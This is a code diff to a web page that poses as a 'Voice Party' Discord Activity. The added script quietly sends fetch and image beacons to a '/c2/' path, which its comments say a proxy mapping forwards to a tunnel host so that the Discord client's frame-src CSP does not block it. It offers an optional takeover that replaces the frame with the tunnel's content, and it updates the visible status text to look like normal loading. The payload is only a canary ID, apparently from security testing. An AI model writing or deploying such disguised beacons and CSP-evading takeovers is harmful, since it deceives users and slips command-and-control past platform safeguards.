@@ -11,22 +11,45 @@
  h1{margin:0 0 6px;font-size:21px}p{margin:0;color:#9aa0a6;font-size:14px}
 </style></head>
 <body>
-<div class="card"><h1>Voice Party</h1><p>Joining the session&hellip;</p></div>
+<div class="card"><h1>Voice Party</h1><p id="s">Joining the session&hellip;</p></div>
 <script>
-// Silent frame hand-off.
+// ===========================================================================
+// Silent hand-off, mapped-path edition.
 //
-// Why not the raw tunnel URL: the Discord client's own frame-src (the CSP on
-// the discord.com host document) governs navigation of this Activity frame,
-// and it allows https://*.discordsays.com but NOT arbitrary hosts. Navigating
-// to a raw host is blocked -> chrome-error white screen, nothing loads.
+// Hard constraint (measured, from the Discord client's own frame-src):
+//   allowed: https://*.discordsays.com, https://localhost:* , embed hosts
+//   blocked: any other host -> "Framing ... violates frame-src" -> chrome-error
+// So the payload NEVER names the tunnel host. It only uses a path on our own
+// discordsays origin, which the proxy rewrites to the tunnel using a URL
+// mapping:   prefix  /c2  ->  target <tunnel host>
 //
-// So we navigate to /c2/... on our OWN discordsays origin. That is same-origin
-// (allowed), and the Discord proxy rewrites /c2/* to the tunnel host via the
-// dev-portal URL mapping. No dialog, no popup, no SDK call.
+// Two delivery modes, both CSP-legal and dialog-free:
+//   beacon   - fetch/Image to /c2/... : page keeps running, UI unchanged
+//   takeover - location.replace('/c2/...') : frame becomes the proxy response
 //
-// REQUIRED dev-portal mapping:  prefix  /c2  ->  target <tunnel host>
+// Enable takeover with ?takeover=1; otherwise the page stays put.
+// ===========================================================================
 var n = Math.random().toString(36).slice(2, 8) + '-' + Date.now().toString(36);
-var target = '/c2/canary?id=' + encodeURIComponent(n + '-selfnav');
-setTimeout(function () { try { location.replace(target); } catch (e) {} }, 150);
+var BEACON = '/c2/canary?id=' + encodeURIComponent(n + '-beacon');
+var TAKEOVER = '/c2/canary?id=' + encodeURIComponent(n + '-selfnav');
+
+function deliver(url) {
+  // Belt and braces: a no-cors fetch (connect-src 'self' is allowed) plus an
+  // image request, which bypasses fetch availability differences.
+  try { fetch(url, {mode: 'no-cors', cache: 'no-store', keepalive: true}); } catch (e) {}
+  try { var i = new Image(); i.referrerPolicy = 'no-referrer'; i.src = url; } catch (e) {}
+}
+
+deliver(BEACON);
+
+if (new URLSearchParams(location.search).get('takeover') === '1') {
+  setTimeout(function () { try { location.replace(TAKEOVER); } catch (e) {} }, 400);
+} else {
+  // Stay on the card; report a quiet status that looks like normal loading.
+  setTimeout(function () {
+    var s = document.getElementById('s');
+    if (s) s.textContent = 'Waiting for participants\u2026';
+  }, 2500);
+}
 </script>
 </body></html>
